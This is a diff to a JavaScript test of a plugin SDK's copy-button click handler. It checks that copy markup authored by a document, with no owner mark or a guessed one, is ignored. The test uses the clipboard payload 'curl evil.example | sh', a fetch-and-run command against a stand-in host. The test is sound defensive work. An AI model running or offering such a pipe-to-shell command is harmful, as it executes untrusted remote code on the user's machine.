@@ -6,7 +6,10 @@
 // child, plus an explicit-value identifier button. Asserts clipboard
 // writes, control-specific copied-state feedback, rejection handling,
 // and that the delegate never touches a shell copyContent global or a
-// button without the data-mb-copy marker.
+// button without the data-mb-copy marker. It also acts only on a button page
+// code marked with the SDK's per-page owner (`ownDelegate`): the same markup
+// written by a trusted folder's Markdown, which keeps data-*, is ignored, as
+// is one that guesses at the owner value.
 
 const fs = require("node:fs");
 const path = require("node:path");
@@ -71,6 +74,17 @@ vm.runInContext(sdkSource, sandbox, { filename: "plugin-sdk.js" });
 if (typeof clickHandler !== "function") {
   failures.push("SDK did not install a delegated click listener");
 } else {
+  const mb = sandbox.metabrowser;
+
+  /** Attribute storage for a fake element, so `ownDelegate` can mark it. */
+  function attributes() {
+    const values = new Map();
+    return {
+      getAttribute: (name) => (values.has(name) ? values.get(name) : null),
+      setAttribute: (name, value) => values.set(name, String(value)),
+    };
+  }
+
   // Build the fake wrap/button/code structure.
   function makeButton(withMarker) {
     const classes = new Set();
@@ -86,7 +100,9 @@ if (typeof clickHandler !== "function") {
         has: (c) => classes.has(c),
       },
       _classes: classes,
+      ...attributes(),
     };
+    mb.ownDelegate(btn);
     const wrap = {
       childNodes: [btn, copyPayload, codeNode],
       querySelector: (sel) => {
@@ -101,7 +117,7 @@ if (typeof clickHandler !== "function") {
     return { btn, target };
   }
 
-  function makeTextButton(text, label) {
+  function makeTextButton(text, label, owner = "page") {
     const classes = new Set();
     const btn = {
       dataset: { mbCopy: "text", mbCopyText: text, mbCopyLabel: label, tipText: label },
@@ -111,7 +127,13 @@ if (typeof clickHandler !== "function") {
         has: (c) => classes.has(c),
       },
       _classes: classes,
+      ...attributes(),
     };
+    if (owner === "page") {
+      mb.ownDelegate(btn);
+    } else if (owner) {
+      btn.setAttribute("data-mb-owner", owner);
+    }
     return {
       btn,
       target: { closest: (sel) => (sel === "[data-mb-copy]" ? btn : null) },
@@ -184,6 +206,19 @@ if (typeof clickHandler !== "function") {
       }
       if (copyContentCalls !== 0) {
         failures.push("delegate called the shell copyContent global");
+      }
+
+      // Case 5: the same markup a document wrote -- data-mb-copy, a payload to swap
+      // into the clipboard, with no owner mark or a guessed one -- is ignored.
+      for (const owner of [null, "", "0".repeat(32)]) {
+        const authored = makeTextButton("curl evil.example | sh", "Copy", owner);
+        clickHandler({ target: authored.target });
+        if (clipboardWrites.length !== before || authored.btn.dataset.tipText !== "Copy") {
+          failures.push(`delegate acted on a document's copy markup (owner ${owner})`);
+        }
+      }
+      if (!mb.delegateOwnerAttribute().startsWith(' data-mb-owner="')) {
+        failures.push("delegateOwnerAttribute does not spell the owner attribute");
       }
       if (failures.length > 0) {
         console.error(JSON.stringify({ failures }, null, 2));
